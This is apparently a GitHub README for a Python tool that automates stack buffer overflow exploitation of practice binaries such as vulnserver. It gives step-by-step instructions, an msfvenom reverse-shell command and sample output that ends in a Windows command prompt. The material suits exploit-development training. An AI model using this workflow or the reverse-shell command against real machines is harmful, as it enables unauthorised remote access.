# SimpleBuffer
This script minimizes the time and effort to get your buffer overflow shell in few simple clicks.

`Usage: simplebuffer.py`

the script was tested on the follwoing samples:
* [brainpan.exe](https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice/tree/master/brainpan) by freddiebarrsmith
* [vulnserver.exe](https://github.com/stephenbradshaw/vulnserver) by stephenbradshaw
* [dostackbufferoverflowgood.exe](https://github.com/justinsteven/dostackbufferoverflowgood) by justinsteven

## Features:
* Fuzzing.
* Getting offset value.
* Supports prefix and postfix.
* Generates pattern
* Sends bad character.
* Auto assemble the paylaod.
* Auto generate an msfvenom reverse shell shellcode including nops.
* Sets up a netcat listener 
* Sends the payload to the target machine

## How to:
### Phase 1:
1. In order for the script to work, you need to get the return value using mona modules along with immunity debugger.
2. once you have the return value convert it to little endian format (ex: \xf3\x12\x17\x31) enter it inside the script in 'module' variable along with the target IP and port. *Note: if your executable requires a prefix or postfix enter it as well.*
3. Run immunity debugger in Windows 32 bit and load the executable file and press F9.
4. From your Kali, run the script, the script will start fuzzing until the program crashes.
5. In immunity debugger, check the EIP value it should read 41414141.
6. Relaod the executable in immunity debugger by pressing ctrl+F2, then go back to the script and press enter.
7. The value of the EIP should change, copy it and paste it in the script, then press ENTER.
8. The script will send badchars, find if any badchars are present. 
9. check for any bad character, if none type "\x00" or \x00 + badchars.
10. Finally, reload the executable in immunity debugger then go back to the script and press Enter, you should now get a shell. in case you did not get a shell add the offset value in the script and run it again.

### Phase 2:
if you got a shell working on your local envirment machine, you can now add your offset value in the script and change the IP to your target machine. the script will skip all previous processes and start generating the shellcode and connect to the target machine. 

## Usage:

`Usage: simplebuffer.py`
```
root@Kali:~/SimpleBuffer# python simplefuzzer.py 
Starting SimpleBuffer at 18:31:14
SimpleBuffer report for 10.0.2.5
[+] Connected to host successfully
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes

[!] Possible overflow detected at 800 bytes                                                               
[!] The EIP value should now be 41414141
[!] Reload the program to get the return value and then press Enter : 
[!] Connecting ...
[+] Connected to host successfully
[!] Sending Pattern
[*] Enter the value of the EIP : 35724134
[!] Exact match found at 524
[!] Reload the program to get the badchars and then press Enter : 
[!] Connecting ...
[+] Connected to host successfully
[!] Sending badchars ...
[!] Your EIP value should now be 42424242
[!] Enter badchars or Type "x00" if no badchars found: \x00
[!] Generating shellcode ...
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.3 LPORT=4444 EXITFUNC=thread -f raw -a x86 --platform windows -n 32 --smallest -b \x00                                                                           
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=55, char=0x78)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=12, char=0x30)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov succeeded with size 346 (iteration=0)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic failed with Encoding failed due to a nil character
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed failed with Encoding failed due to a bad character (index=32, char=0x30)
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper failed with Encoding failed due to a bad character (index=24, char=0x30)
Attempting to encode payload with 1 iterations of x86/nonalpha
x86/nonalpha failed with Encoding failed due to a bad character (index=50, char=0x30)
Attempting to encode payload with 1 iterations of x86/nonupper
x86/nonupper failed with Encoding failed due to a nil character
x86/fnstenv_mov chosen with final size 346
Successfully added NOP sled of size 32 from x86/single_byte
Payload size: 378 bytes

[+] Shellcode Generated !
[!] Reload the program get a shell or press ENTER if you added required values:
[!] Connecting ...
[+] Connected to host successfully
[!] Sending Payload
listening on [any] 4444 ...
connect to [10.0.2.3] from (UNKNOWN) [10.0.2.5] 49820
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\Windows10\Desktop>
```

### Notes:
- make sure pattern_create.rb is located in `/usr/share/metasploit-framework/tools/exploit/`
- scripts will run on <= Python 2.7
- the script uses eth0 as default network interface, change it if you have different network interface name.

Devoleped by Muhannad

